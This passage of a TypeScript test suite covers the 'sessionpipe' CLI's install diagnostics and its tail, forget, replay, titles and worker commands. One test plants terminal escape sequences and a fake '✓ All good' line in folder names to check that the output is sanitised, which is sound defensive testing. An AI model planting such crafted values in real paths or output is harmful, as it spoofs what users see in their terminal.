      sentence,
      `2 copies of sessionpipe are on this computer (1.0.0 in ${local}; 0.9.0 in ${other}); \`sessionpipe reinstall\` leaves one clean copy`,
    ]);
  });

  it("M3: a file first on PATH that is no link of npm's, and doctor not started through it: which copy it starts can't be told, so doctor has no finding: all good, as `reinstall` says nothing to repair", async () => {
    // As asdf, nodenv or mise in shims mode lay it out: the shim first on PATH, the one
    // healthy copy in the manager's own Node. These tests run from a checkout.
    const prefix = path.join(home, ".asdf", "installs", "nodejs", "22.1.0");
    const copy = install(prefix, "1.0.0");
    const shim = path.join(home, ".asdf", "shims", "sessionpipe");
    put(shim, '#!/bin/sh\nexec asdf exec sessionpipe "$@"\n');
    chmodSync(shim, 0o755);
    onPath(path.dirname(shim));
    // The file may well be the shim that starts this very copy: nothing is KNOWN to be
    // astray. Doctor says only what is known (a row and a thing to fix of "can't be told"
    // made every asdf, nodenv and mise computer one that needs attention).
    const d = await run("doctor");
    expect(d.lines[0]).toBe("✓ All good");
    expect(d.text).not.toMatch(/^ {2}. copies /m);
    expect(d.text).not.toContain("can't be told");
    expect(fixes(d)).toEqual([]);
    expect(process.exitCode).toBeUndefined();
    const brief = await run("status");
    expect(brief.lines[0]).toBe("✓ All good");
    expect(brief.text).not.toContain("copies");
    const j = await json();
    // The copy is whole and the only one: nothing is said of it, and nobody is known to type it.
    expect(j.copies).toEqual([{ dir: copy, version: "1.0.0", whole: true, uses: [] }]);
    expect(about(j)).toEqual([]);
    expect(j.warnings.filter((w: string) => /shims|can't be told/.test(w))).toEqual([]);
  });

  it("M3: nothing is typed and the folder an installed copy's command is in is not on PATH: that copy's folder is named; with no copy installed there is nothing to say of PATH", async () => {
    // No copy at all, and no folder on PATH where one would go: nothing to say of this
    // computer. (Doctor named `~/.local/bin` here, the one place it knows without asking
    // npm, and counted it as a thing to fix: for anyone who runs it through npx or from a
    // checkout before installing, and of a folder `reinstall` might never install into.)
    onPath(path.join(home, "elsewhere"));
    const none = await run("doctor");
    expect(none.lines[0]).toBe("✓ All good");
    expect(none.text).not.toMatch(/^ {2}. copies /m);
    expect(none.text).not.toContain("on your PATH");
    expect(fixes(none)).toEqual([]);
    expect(process.exitCode).toBeUndefined();
    expect((await run("status")).text).not.toContain("copies");
    const j = await json();
    expect(j.copies).toEqual([]);
    expect(about(j)).toEqual([]);
    // With no PATH at all, the same.
    onPath();
    expect((await run("doctor")).lines[0]).toBe("✓ All good");
    expect(about(await json())).toEqual([]);
    onPath(path.join(home, "elsewhere"));
    // One whole copy that no folder on PATH leads to: `sessionpipe` is not found, and its
    // own folder is the one to add. A thing to fix, said once more under "To fix", with no
    // command of sessionpipe's.
    const stray = install(path.join(home, ".npm-global"), "1.0.0");
    const off = await json();
    expect(off.copies).toEqual([{ dir: stray, version: "1.0.0", whole: true, uses: [] }]);
    expect(about(off)).toEqual([NOT_FOUND("~/.npm-global/bin")]);
    const lost = await run("doctor");
    expect(lost.text).toMatch(row("!", "copies", NOT_FOUND("~/.npm-global/bin")));
    expect(lost.lines[0]).toBe("! 1 thing needs attention");
    expect(fixes(lost)).toEqual(["To fix", `  1. ${NOT_FOUND("~/.npm-global/bin")}`]);
    expect(process.exitCode).toBeUndefined();
    expect(said(await run("status"), "This computer")).toMatch(
      /^! .*, copies: ~\/\.npm-global\/bin is not on your PATH: /,
    );
    // The same where another folder of one's own IS on PATH, and empty: the copy is still
    // not found, and it is the copy's folder that is named ("All good" was said here).
    mkdirSync(path.join(home, ".local", "bin"), { recursive: true });
    onPath(path.join(home, ".local", "bin"));
    expect(about(await json())).toEqual([NOT_FOUND("~/.npm-global/bin")]);
    expect((await run("doctor")).lines[0]).toBe("! 1 thing needs attention");
    // Added, it is what typing starts: nothing to say.
    onPath(path.join(home, "elsewhere"), path.join(home, ".npm-global", "bin"));
    const on = await json();
    expect(on.copies).toEqual([{ dir: stray, version: "1.0.0", whole: true, uses: ["typed"] }]);
    expect(about(on)).toEqual([]);
    expect((await run("doctor")).text).not.toMatch(/^ {2}. copies /m);
  });

  it("a home that is a link ($HOME names it by another spelling than the disk does): what doctor says of a folder under it reads `~` all the same", async () => {
    // The look spells a folder by where it really is; `~` was written only for $HOME's
    // own spelling, so the whole real path was printed in every row and sentence.
    install(path.join(home, ".local"), "1.0.0");
    install(path.join(home, ".npm-global"), "0.9.0");
    const alias = path.join(tmp, "alias");
    symlinkSync(home, alias);
    vi.stubEnv("HOME", alias);
    vi.stubEnv("USERPROFILE", alias);
    onPath(path.join(home, "elsewhere"));
    const d = await run("doctor");
    expect(d.text).toMatch(
      row(
        "!",
        "copies",
        `1.0.0 in ~/.local (nothing uses it); 0.9.0 in ~/.npm-global (nothing uses it); ${NOT_FOUND("~/.local/bin")}`,
      ),
    );
    expect(fixes(d).at(-1)).toBe(`  2. ${NOT_FOUND("~/.local/bin")}`);
    const brief = said(await run("status"), "This computer");
    expect(brief).toContain("copies: 1.0.0 in ~/.local (nothing uses it); 0.9.0 in ~/.npm-global (nothing uses it)");
    expect(brief).not.toContain(home);
    // A link that leads nowhere, named by its file: the same.
    rmSync(path.join(home, ".npm-global", "lib"), { recursive: true });
    expect((await run("doctor")).text).toMatch(/~\/\.npm-global\/bin\/sessionpipe, a link to one that is gone/);
  });

  it("M1: one healthy copy, and PATH names its folder by another spelling of this home (a link to it): one copy, nothing to say", async () => {
    const local = install(path.join(home, ".local"), "1.0.0");
    const alias = path.join(tmp, "alias");
    symlinkSync(home, alias);
    onPath(path.join(alias, ".local", "bin"));
    const j = await json();
    expect(j.copies).toEqual([{ dir: local, version: "1.0.0", whole: true, uses: ["typed"] }]);
    expect(about(j)).toEqual([]);
    const d = await run("doctor");
    expect(d.lines[0]).toBe("✓ All good");
    expect(d.text).not.toMatch(/^ {2}. copies /m);
    expect(d.text).not.toContain("sessionpipe reinstall");
    expect((await run("status")).lines[0]).toBe("✓ All good");
    // Both spellings on PATH, in either order: still the one folder.
    for (const dirs of [
      [path.join(alias, ".local", "bin"), path.join(home, ".local", "bin")],
      [path.join(home, ".local", "bin"), path.join(alias, ".local", "bin")],
    ]) {
      onPath(...dirs);
      const twice = await json();
      expect(twice.copies).toEqual([{ dir: local, version: "1.0.0", whole: true, uses: ["typed"] }]);
      expect(about(twice)).toEqual([]);
    }
    // And the other way round: this home is itself the link, and PATH names the real folder.
    vi.stubEnv("HOME", alias);
    onPath(path.join(home, ".local", "bin"));
    const linked = await json();
    expect(linked.copies).toEqual([{ dir: local, version: "1.0.0", whole: true, uses: ["typed"] }]);
    expect(about(linked)).toEqual([]);
  });

  it.skipIf(!IGNORES_CASE)(
    "M1: one healthy copy, and PATH names its folder in another case on a disk that ignores case: one copy, nothing to say",
    async () => {
      const local = install(path.join(home, ".local"), "1.0.0");
      onPath(path.join(home, ".Local", "bin"));
      const j = await json();
      expect(j.copies).toEqual([{ dir: local, version: "1.0.0", whole: true, uses: ["typed"] }]);
      expect(about(j)).toEqual([]);
      expect((await run("doctor")).text).not.toMatch(/^ {2}. copies /m);
    },
  );

  it("L3: a folder's name is a word from the disk: what a terminal acts on is out of it before it is said, on the page and for a program", async () => {
    // A link to a copy that is gone, in a folder someone named with a colour code and a
    // clear-screen in it; and a checkout that is what typing starts, in one named with a
    // line break that would start a line of its own.
    const odd = path.join(home, `pre${ESC}[31mfix${ESC}[2J`);
    mkdirSync(path.join(odd, "bin"), { recursive: true });
    symlinkSync(
      path.join("..", "lib", "node_modules", "sessionpipe", "dist", "cli.js"),
      path.join(odd, "bin", "sessionpipe"),
    );
    const source = pkg(path.join(home, `src${ESC}[32m\n✓ All good`, "sessionpipe"), "1.1.0");
    put(path.join(source, "src", "cli.ts"), "");
    mkdirSync(path.join(home, "bin"), { recursive: true });
    symlinkSync(path.join(source, "dist", "cli.js"), path.join(home, "bin", "sessionpipe"));
    onPath(path.join(home, "bin"), path.join(odd, "bin"));
    const sentence = "Typing `sessionpipe` starts ~/src ✓ All good/sessionpipe, which is no installed copy of it.";
    const piped = await run("doctor");
    expect(piped.text).not.toContain(ESC);
    expect(piped.text).toMatch(row("!", "copies", `~/prefix/bin/sessionpipe, a link to one that is gone; ${sentence}`));
    for (const where of [{ tty: true, columns: 100 }, { tty: true, columns: 40 }, {}]) {
      const d = await runAt(where, "doctor", "--no-color");
      expect(d.text).not.toContain(ESC);
      // One verdict, and it is doctor's own: the folder's name starts no line of the page.
      expect(d.lines[0]).toBe("! 2 things need attention");
      expect(d.lines.filter((l) => /^\s*✓ All good/.test(l))).toEqual([]);
      const s = await runAt(where, "status", "--no-color");
      expect(s.text).not.toContain(ESC);
      expect(s.lines.filter((l) => /^\s*✓ All good/.test(l))).toEqual([]);
    }
    // For a program the sentence is the one a person reads, with nothing of the folder's
    // name left in it that a terminal printing it would act on.
    const j = await json();
    expect(about(j).filter((w) => w.startsWith("Typing"))).toEqual([sentence]);
  });

  it("Windows: doctor and status do not look for copies of sessionpipe there, whatever is on the disk", async () => {
    // What is two copies and a checkout first on PATH anywhere else.
    const local = install(path.join(home, ".local"), "1.0.0");
    const other = install(path.join(home, ".npm-global"), "0.9.0");
    checkout();
    onPath(path.join(home, "bin"), path.join(home, ".local", "bin"));
    for (const p of ["darwin", "linux"] as const) {
      onPlatform(p);
      const j = await json();
      expect(j.copies.map((c: { dir: string }) => c.dir)).toEqual([local, other]);
      expect(about(j)).toHaveLength(2);
      const d = await run("doctor");
      expect(d.text).toMatch(/^ {2}! copies /m);
      expect(fixes(d)).toContain("       sessionpipe reinstall");
      expect(said(await run("status"), "This computer")).toContain("copies: ");
    }
    expect(vi.mocked(look)).toHaveBeenCalledTimes(6);
    vi.mocked(look).mockClear();
    process.exitCode = undefined;

    onPlatform("win32");
    const j = await json();
    expect(j.copies).toEqual([]);
    expect(about(j)).toEqual([]);
    expect(j.warnings.join("\n")).not.toContain("reinstall");
    const d = await run("doctor");
    expect(d.text).not.toMatch(/^ {2}. copies /m);
    // Nothing to fix, so `reinstall` is named nowhere: not as a thing to do, and not as the
    // way back in that a page with something to fix ends with.
    expect(fixes(d)).toEqual([]);
    expect(d.text).not.toContain("reinstall");
    expect(d.lines[0]).toBe("✓ All good");
    expect(process.exitCode).toBeUndefined();
    expect(said(await run("status"), "This computer")).not.toContain("copies");
    // It did not look: nothing was read to decide there is nothing to say.
    expect(vi.mocked(look)).not.toHaveBeenCalled();
  });
});

describe.skipIf(process.platform === "win32")("tail, backfill, forget, replay", () => {
  it("tail follows the outbox from its end, one line per event, filtered to a tier, a harness and a session", async () => {
    const outbox = new Outbox(state);
    const old = { harness: "claude-code", session: "0123456789abcdef" };
    outbox.append(old, [event("session.heartbeat", {})]);
    outbox.append({ harness: "codex", session: "other" }, [event("session.heartbeat", {})]);
    vi.useFakeTimers({ toFake: ["setTimeout"] });
    try {
      const lines: string[] = [];
      void cli.main(["tail", "--tier", "3", "--harness", "claude-code", "--session", "0123"], {
        out: (s = "") => void lines.push(s),
        err: vi.fn(),
        exit: vi.fn(),
      });
      await vi.advanceTimersByTimeAsync(600);
      expect(lines).toEqual([`sessionpipe tail · tier 3 · ${path.join(state, "outbox")} (Ctrl-C to stop)`]);
      outbox.append(old, [
        event("session.started", { source: "startup" }, { cwd: "/p", branch: "main" }),
        event("session.started", { source: "resume" }),
        event("turn.started", { prompt_chars: 12 }),
        event("turn.started", { submitted_by: "loop_wakeup", injected: true, prompt_chars: 406 }),
        event("turn.started", {}),
        event("tool.started", { tool: "Bash" }),
        event("tool.started", {}),
        event("tool.ended", { tool: "Bash", ok: true, ms: 5 }),
        event("tool.ended", { tool: "Edit", ok: false }),
        event("attention.needed", { kind: "permission", tool: "Bash", message: "may I?" }),
        event("attention.needed", { kind: "idle" }),
        event("turn.ended", { reason: "done" }),
        event("turn.ended", {}),
        event("session.ended", { reason: "exit" }),
        event("turn.transcript", { turn: 1, user: "hello\n  there", assistant: "hi" }),
        event("turn.progress", { turn: 2, assistant: "so far" }),
        event("turn.progress", { turn: 2 }),
        event("session.backfill", { started_at: "x" }, { title: "T" }),
        event("session.backfill", { started_at: "x" }),
        event("custom.thing", { n: 1 }),
      ]);
      outbox.append({ harness: "codex", session: "other" }, [event("tool.started", { tool: "x" })]);
      outbox.append({ harness: "claude-code", session: "zzzz" }, [event("tool.started", { tool: "x" })]);
      await vi.advanceTimersByTimeAsync(500);
      const detail = lines.slice(1).map((l) =>
        l
          .slice(l.indexOf("…  ") + 3)
          .replace(/\s+/g, " ")
          .trim(),
      );
      expect(detail).toEqual([
        "session.started source=startup /p main",
        "session.started source=resume",
        "turn.started prompt_chars=12",
        "turn.started submitted_by=loop_wakeup injected prompt_chars=406",
        "turn.started",
        "tool.started Bash",
        "tool.started",
        "tool.ended Bash ok 5ms",
        "tool.ended Edit error",
        'attention.needed permission Bash "may I?"',
        "attention.needed idle",
        "turn.ended done",
        "turn.ended",
        "session.ended reason=exit",
        'turn.transcript #1 "hello there"',
        "turn.progress #2 6 chars so far",
        "turn.progress #2 0 chars so far",
        "session.backfill T",
        "session.backfill",
        'custom.thing {"n":1}',
      ]);
      expect(lines[1]).toMatch(/^\d\d:\d\d:\d\d claude-code 0123… {2}session\.started/);
    } finally {
      vi.useRealTimers();
    }
  });

  it("tail --all --json replays every file from its start as JSON, at tier 1 by default", async () => {
    const outbox = new Outbox(state);
    outbox.append({ harness: "claude-code", session: "s" }, [
      event("tool.started", { tool: "Bash" }),
      event("turn.transcript", { turn: 1, user: "secret prompt", assistant: "" }),
    ]);
    symlinkSync(path.join(state, "gone.jsonl"), path.join(state, "outbox", "claude-code", "dangling.jsonl"));
    vi.useFakeTimers({ toFake: ["setTimeout"] });
    try {
      const lines: string[] = [];
      void cli.main(["tail", "--all", "--json"], { out: (s = "") => void lines.push(s), err: vi.fn(), exit: vi.fn() });
      await vi.advanceTimersByTimeAsync(10);
      expect(lines).toHaveLength(2);
      expect(JSON.parse(lines[1]!)).toMatchObject({ type: "tool.started", data: { tool: "Bash" } });
      expect(lines.join("\n")).not.toContain("secret prompt");
      // A session that starts after tail did is read from its first byte.
      outbox.append({ harness: "codex", session: "new" }, [event("tool.started", { tool: "Edit" })]);
      await vi.advanceTimersByTimeAsync(500);
      expect(lines).toHaveLength(3);
      expect(JSON.parse(lines[2]!)).toMatchObject({ type: "tool.started", data: { tool: "Edit" } });
    } finally {
      vi.useRealTimers();
    }
  });

  it("backfill takes --days and the harness flags", async () => {
    put(path.join(home, ".claude", "settings.json"), {});
    const spy = vi.spyOn(claudeCode, "backfill").mockReturnValue([]);
    expect((await run("backfill", "--days", "2", "--claude-code")).lines).toEqual([
      "  ✓ Backfill: 0 sessions from the last 2 days queued as session.backfill",
    ]);
    expect(Date.now() - (spy.mock.calls[0]?.[0] as number)).toBeGreaterThanOrEqual(2 * 86_400_000 - 5000);
    expect((await run("backfill")).lines).toEqual([
      "  ✓ Backfill: 0 sessions from the last 30 days queued as session.backfill",
    ]);
  });

  it("forget asks every sink to delete the session and drops its outbox", async () => {
    const ok = await receiver();
    const outbox = new Outbox(state);
    outbox.append({ harness: "claude-code", session: "s1" }, [event("session.heartbeat", {})]);
    writeConfig({
      sinks: [
        { name: "ok", url: ok.url, tier: 1 },
        { name: "gone", url: "http://127.0.0.1:1", tier: 1 },
      ],
      harnesses: {},
    } as never);
    expect((await run("forget")).lines).toEqual(["usage: sessionpipe forget <harness> <session>"]);
    expect((await run("forget", "claude-code")).lines).toEqual(["usage: sessionpipe forget <harness> <session>"]);
    const { lines } = await run("forget", "claude-code", "s1");
    expect(lines).toEqual([
      "  ✓ ok: asked to delete claude-code:s1",
      "  ✗ gone: fetch failed",
      "  local outbox for the session removed, and every sink's cursor into it",
    ]);
    expect(existsSync(outbox.file({ harness: "claude-code", session: "s1" }))).toBe(false);
    // A sink's refusal without a message: the status is what there is to say.
    vi.spyOn(HttpSink.prototype, "send").mockResolvedValue({
      ok: false,
      acknowledged: 0,
      status: 503,
      action: "retry",
    });
    expect((await run("forget", "claude-code", "s2")).lines[0]).toBe("  ✗ ok: 503");
  });

  it("forget takes the drain's flush lock first; held past the wait, it changes nothing and says so", async () => {
    const ok = await receiver();
    const outbox = new Outbox(state);
    const s1 = { harness: "claude-code", session: "s1" };
    outbox.append(s1, [event("session.heartbeat", {})]);
    const cursor = new Cursors(state, "ok");
    cursor.write({ "claude-code/s1": 50 });
    writeConfig({ sinks: [{ name: "ok", url: ok.url, tier: 1 }], harnesses: {} } as never);
    const held = takeNamedLock(state, "flush");
    expect(held).not.toBeNull();
    vi.useFakeTimers({ toFake: ["setTimeout"] });
    try {
      const p = run("forget", "claude-code", "s1");
      await vi.advanceTimersByTimeAsync(10_500);
      const { lines } = await p;
      expect(lines).toEqual([
        "  ✗ a drain is running (the flush lock is held); nothing was changed, try again in a moment",
      ]);
    } finally {
      vi.useRealTimers();
    }
    expect(process.exitCode).toBe(1);
    process.exitCode = undefined;
    expect(ok.posts).toEqual([]);
    expect(existsSync(outbox.file(s1))).toBe(true);
    expect(existsSync(path.join(state, "outbox", "claude-code", "s1.seq"))).toBe(false);
    expect(cursor.read()).toEqual({ "claude-code/s1": 50 });
    // Let go within the wait: the command goes on.
    setTimeout(() => held?.(), 300);
    const { lines } = await run("forget", "claude-code", "s1");
    expect(lines).toEqual([
      "  ✓ ok: asked to delete claude-code:s1",
      "  local outbox for the session removed, and every sink's cursor into it",
    ]);
    expect(ok.posts).toHaveLength(1);
    expect(existsSync(outbox.file(s1))).toBe(false);
    expect(cursor.read()).toEqual({});
    expect(takeNamedLock(state, "flush")).not.toBeNull();
  });

  it("forget and replay send what a worker left under `flush.more` while they held the lock", async () => {
    const ok = await receiver({ body: { accepted: 1 } });
    const outbox = new Outbox(state);
    writeConfig({ sinks: [{ name: "ok", url: ok.url, tier: 1 }], harnesses: {} } as never);
    const more = path.join(state, "locks", "flush.more");
    // What a hook worker does when it finds the lock held: appends, marks, leaves.
    const worker = (s: string) => {
      outbox.append({ harness: "claude-code", session: s }, [event("session.heartbeat", {})]);
      mkdirSync(path.dirname(more), { recursive: true });
      writeFileSync(more, "");
    };
    worker("s2");
    expect((await run("forget", "claude-code", "s1")).lines).toEqual([
      "  ✓ ok: asked to delete claude-code:s1",
      "  local outbox for the session removed, and every sink's cursor into it",
    ]);
    expect(existsSync(more)).toBe(false);
    expect(ok.posts).toHaveLength(2);
    expect(new Cursors(state, "ok").read()["claude-code/s2"]).toBeGreaterThan(0);
    worker("s3");
    expect((await run("replay", "--sink", "ok")).lines).toEqual(["  ok: 1 event delivered"]);
    expect(existsSync(more)).toBe(false);
    expect(ok.posts).toHaveLength(3);
  });

  it("forget drops the session from every sink's cursor, so a session that goes on is delivered from its start", async () => {
    const ok = await receiver({ body: { accepted: 1 } });
    const outbox = new Outbox(state);
    const s1 = { harness: "claude-code", session: "s1" };
    const s2 = { harness: "claude-code", session: "s2" };
    outbox.append(s1, [event("session.heartbeat", {}), event("session.heartbeat", {}, { seq: 1 })]);
    outbox.append(s2, [event("session.heartbeat", {})]);
    writeConfig({ sinks: [{ name: "ok", url: ok.url, tier: 1 }], harnesses: {} } as never);
    expect((await run("replay", "--sink", "ok")).lines).toEqual(["  ok: 3 events delivered"]);
    const cursor = new Cursors(state, "ok");
    const s2End = cursor.read()["claude-code/s2"];
    expect(cursor.read()["claude-code/s1"]).toBeGreaterThan(0);
    // A sink since taken out of the config still has a cursor file; a file that
    // doesn't parse is left as it is.
    new Cursors(state, "old").write({ "claude-code/s1": 999, "codex/x": 1 });
    writeFileSync(path.join(state, "cursors", "bad.json"), '{"claude-code/s1": 9');
    expect((await run("forget", "claude-code", "s1")).lines).toEqual([
      "  ✓ ok: asked to delete claude-code:s1",
      "  local outbox for the session removed, and every sink's cursor into it",
    ]);
    expect(cursor.read()).toEqual({ "claude-code/s2": s2End });
    expect(new Cursors(state, "old").read()).toEqual({ "codex/x": 1 });
    expect(readFileSync(path.join(state, "cursors", "bad.json"), "utf8")).toBe('{"claude-code/s1": 9');
    // The session goes on: one event in a new file, shorter than the old offset.
    outbox.append(s1, [event("tool.started", { tool: "Bash" })]);
    expect((await run("replay", "--sink", "ok")).lines).toEqual(["  ok: 1 event delivered"]);
    const last = ok.posts.at(-1) as { events: { type: string; session: { id: string } }[] };
    expect(last.events.map((e) => [e.type, e.session.id])).toEqual([["tool.started", "0123456789abcdef"]]);
  });

  it("replay sends what a sink has not taken yet, or everything again from the start", async () => {
    const rx = await receiver({ body: { accepted: 1 } });
    const outbox = new Outbox(state);
    outbox.append({ harness: "claude-code", session: "s1" }, [event("session.heartbeat", {})]);
    outbox.append({ harness: "claude-code", session: "s2" }, [
      event("session.heartbeat", {}),
      event("session.heartbeat", {}),
    ]);
    writeConfig({
      sinks: [
        { name: "rx", url: rx.url, tier: 1 },
        { name: "f", url: `file:${tmp}/sink.jsonl`, tier: 1 },
      ],
      harnesses: {},
    } as never);
    expect((await run("replay", "--sink", "nope")).lines).toEqual(["  no such sink"]);
    expect((await run("replay", "--sink", "f")).lines).toEqual(["  f: 3 events delivered"]);
    expect((await run("replay", "--sink", "f")).lines).toEqual(["  f: 0 events delivered"]);
    const all = await run("replay", "--from-start");
    expect(all.lines.sort()).toEqual(["  f: 3 events delivered", "  rx: 3 events delivered"]);
    outbox.append({ harness: "claude-code", session: "s3" }, [event("session.heartbeat", {})]);
    expect((await run("replay", "--sink", "f")).lines).toEqual(["  f: 1 event delivered"]);
  });

  it("replay goes under the drain's flush lock too: held past the wait, it rewinds and sends nothing", async () => {
    const rx = await receiver();
    const outbox = new Outbox(state);
    outbox.append({ harness: "claude-code", session: "s1" }, [event("session.heartbeat", {})]);
    writeConfig({ sinks: [{ name: "rx", url: rx.url, tier: 1 }], harnesses: {} } as never);
    const cursor = new Cursors(state, "rx");
    cursor.write({ "claude-code/s1": 50 });
    const held = takeNamedLock(state, "flush");
    vi.useFakeTimers({ toFake: ["setTimeout"] });
    try {
      const p = run("replay", "--from-start");
      await vi.advanceTimersByTimeAsync(10_500);
      expect((await p).lines).toEqual([
        "  ✗ a drain is running (the flush lock is held); nothing was changed, try again in a moment",
      ]);
    } finally {
      vi.useRealTimers();
    }
    expect(process.exitCode).toBe(1);
    process.exitCode = undefined;
    expect(rx.posts).toEqual([]);
    expect(cursor.read()).toEqual({ "claude-code/s1": 50 });
    held?.();
    expect((await run("replay", "--from-start")).lines).toEqual(["  rx: 1 event delivered"]);
    expect(takeNamedLock(state, "flush")).not.toBeNull();
  });

  it("replay says how many tool events a sink's setting thinned; --tools all sends every one, this once", async () => {
    const rx = await receiver({ body: { accepted: 1 } });
    const outbox = new Outbox(state);
    const sub = (type: string) => event(type, { tool: "Bash", ok: true, agent_id: "a1" });
    outbox.append({ harness: "claude-code", session: "s1" }, [
      sub("tool.started"),
      sub("tool.ended"),
      sub("tool.started"),
      sub("tool.ended"),
    ]);
    // A receiver that asked for thinned tool events (its well-known file said `main`).
    writeConfig({ sinks: [{ name: "rx", url: rx.url, tier: 1, receiver_tools: "main" }], harnesses: {} } as never);
    expect((await run("replay", "--sink", "rx")).lines).toEqual([
      "  rx: 1 event delivered, 3 tool events thinned (--tools all sends every one)",
    ]);
    expect((await run("replay", "--sink", "rx", "--from-start", "--tools", "all")).lines).toEqual([
      "  rx: 4 events delivered",
    ]);
    expect(readConfig().sinks[0]?.tools).toBeUndefined();
    // --from-start started the minute over: the next tool.ended goes, its tool.started doesn't.
    outbox.append({ harness: "claude-code", session: "s1" }, [sub("tool.started"), sub("tool.ended")]);
    expect((await run("replay", "--sink", "rx")).lines).toEqual([
      "  rx: 1 event delivered, 1 tool event thinned (--tools all sends every one)",
    ]);
    const bad = await run("replay", "--tools", "some");
    expect(bad.lines).toEqual(['  ! --tools takes all, main or beat (got "some"): nothing was sent']);
    expect(process.exitCode).toBe(2);
    process.exitCode = undefined;
  });
});

describe("titles", () => {
  it("on and off set remote_titles; with no word it says which holds", async () => {
    expect((await run("titles")).lines).toEqual([
      "  Session names come from this machine's files only, and no sign-in token is read. A session the Claude app started has a name there that never reaches this machine; `sessionpipe titles on` asks claude.ai for it.",
    ]);
    expect(cfg().remote_titles).toBeUndefined();
    expect((await run("titles", "on")).text).toContain(
      "✓ Claude Code sessions with a claude.ai link take claude.ai's name, as the Claude app shows it, unless you named them here. To ask, sessionpipe reads Claude Code's sign-in token on this machine and sends it to api.anthropic.com only",
    );
    expect(cfg().remote_titles).toBe(true);
    expect((await run("titles")).text).toMatch(/^ {2}Claude Code sessions with a claude\.ai link/);
    expect((await run("titles", "off")).text).toContain("✓ Session names come from this machine's files only");
    expect(cfg().remote_titles).toBe(false);
  });

  it("on and refresh send again, under claude.ai's name, each session already sent under another", async () => {
    const id = (n: number) => `bbbbbbbb-0000-4000-8000-00000000000${n}`;
    const row = (n: number, transcript = `/t/${n}.jsonl`) => ({
      session: { id: id(n), title: "the first ask", title_source: "first-ask" as const },
      started_at: Date.now() - 1000,
      last_at: Date.now(),
      ...(transcript ? { transcript } : {}),
    });
    // 1 was backfilled and 6 sent live under the first ask; 2 went live under the name claude.ai
    // has; 3 was never sent; claude.ai has no name for 4; 5 has no transcript to ask about.
    // 9 was sent before too, but a hook of it holds its lock right now.
    vi.spyOn(claudeCode, "backfill").mockImplementation(() => [
      row(1),
      row(2),
      row(3),
      row(4),
      row(5, ""),
      row(6),
      row(9),
    ]);
    vi.spyOn(claudeCode, "detect").mockReturnValue(true);
    const remote = vi
      .spyOn(claudeCode as Required<typeof claudeCode>, "remoteFacts")
      .mockImplementation(async (s) =>
        s.id === id(4) ? {} : { title: `claude.ai ${s.id.slice(-1)}`, title_source: "harness" as const },
      );
    const facts = factsState(state);
    facts.save("claude-code", id(1), { backfilled: true });
    facts.save("claude-code", id(2), { session: { title: "claude.ai 2", title_source: "harness" } });
    facts.save("claude-code", id(6), { session: { title: "the first ask", cwd: "/w" } });
    facts.save("claude-code", id(9), { backfilled: true });
    const held = takeLock(state, { harness: "claude-code", session: id(9) });
    expect((await run("titles", "on")).lines[1]).toBe(
      "  Asked claude.ai about the last 30 days' sessions: 4 named there, 2 sent again under that name.",
    );
    expect(remote).toHaveBeenCalledTimes(5);
    const sent = (n: number) => new Outbox(state).read({ harness: "claude-code", session: id(n) }, 0).events;
    expect(sent(1)).toMatchObject([
      { type: "session.backfill", session: { title: "claude.ai 1", title_source: "harness" } },
    ]);
    expect(sent(6)).toMatchObject([{ type: "session.backfill", session: { title: "claude.ai 6" } }]);
    for (const n of [2, 3, 4, 5, 9]) expect(sent(n)).toEqual([]);
    expect(remote.mock.calls.map((c) => c[0].id)).not.toContain(id(9));
    held?.();
    expect(facts.get("claude-code", id(6))).toMatchObject({
      backfilled: true,
      sent_title: "claude.ai 6",
      session: { title: "claude.ai 6", title_source: "harness", cwd: "/w" },
    });
    // Again: nothing new to send. Asking which holds asks claude.ai nothing.
    // Again: 9's hook is done now, so it goes; nothing else is new.
    expect((await run("titles", "refresh", "--days", "7")).lines[1]).toBe(
      "  Asked claude.ai about the last 7 days' sessions: 5 named there, 1 sent again under that name.",
    );
    expect(sent(9)).toMatchObject([{ type: "session.backfill", session: { title: "claude.ai 9" } }]);
    await run("titles");
    expect(remote).toHaveBeenCalledTimes(11);
    // A backfill takes claude.ai's names too; a harness with nothing to ask is left alone.
    vi.mocked(claudeCode.backfill).mockImplementation(() => [row(7)]);
    vi.spyOn(codex, "backfill").mockReturnValue([{ ...row(8), session: { id: "codex-8", title: "local" } }]);
    await run("backfill", "--claude-code", "--codex");
    expect(sent(7)).toMatchObject([{ type: "session.backfill", session: { title: "claude.ai 7" } }]);
    expect(new Outbox(state).read({ harness: "codex", session: "codex-8" }, 0).events).toMatchObject([
      { session: { title: "local" } },
    ]);
    // Off: nothing is asked, refresh or not.
    await run("titles", "off");
    await run("titles", "refresh");
    expect(remote).toHaveBeenCalledTimes(12);
    // On, with nothing it could name.
    vi.mocked(claudeCode.detect).mockReturnValue(false);
    expect((await run("titles", "on")).lines[1]).toMatch(
      /^ {2}None of the last 30 days' sessions has a name on claude\.ai that could be read here/,
    );
  });
});

// A Claude Code session id is a UUID; the adapter drops a payload with any other shape
// and no transcript_path as another harness's (claude-code.ts notClaudeCode).
const JOB_SESSION = "7c1e2d3f-4a5b-4c6d-8e9f-0a1b2c3d4e5f";
describe.skipIf(process.platform === "win32")("worker", () => {
  it("runs one queued job from its file and removes the file", async () => {
    expect((await run("worker")).lines).toEqual([]);
    const file = path.join(tmp, "jobs", "one.json");
    put(file, {
      harness: "claude-code",
      event: "SessionStart",
      argv: ["claude-code", "SessionStart"],
      stdin: JSON.stringify({ session_id: JOB_SESSION, hook_event_name: "SessionStart", cwd: tmp }),
      cwd: tmp,
      env: {},
      at: Date.now(),
    });
    await run("worker", file);
    expect(existsSync(file)).toBe(false);
    expect(new Outbox(state).sessions()).toEqual([{ harness: "claude-code", session: JOB_SESSION }]);
  });

  it.skipIf(process.getuid?.() === 0)("a job file it can't remove is still run", async () => {
    const dir = path.join(tmp, "ro");
    const file = path.join(dir, "job.json");
    put(file, { harness: "nope", event: "x", argv: [], stdin: "", cwd: tmp, env: {}, at: 0 });
    chmodSync(dir, 0o555);
    try {
      await run("worker", file);
      expect(existsSync(file)).toBe(true);
    } finally {
      chmodSync(dir, 0o755);
    }
  });
});

describe.skipIf(process.platform === "win32")("a harness config the system won't let us write", () => {
  const settings = () => path.join(home, ".claude", "settings.json");
  const codexHooks = () => path.join(home, ".codex", "hooks.json");
  const codexConfig = () => path.join(home, ".codex", "config.toml");
  afterEach(() => unwritable.files.clear());

  it("is reported with the file and the code, left as it was, and the other harnesses are still hooked", async () => {
    put(settings(), {});
    put(codexConfig(), "");
    vi.spyOn(claudeCode, "backfill").mockReturnValue([]);
    vi.spyOn(codex, "backfill").mockReturnValue([]);
    for (const code of ["EACCES", "EPERM"]) {
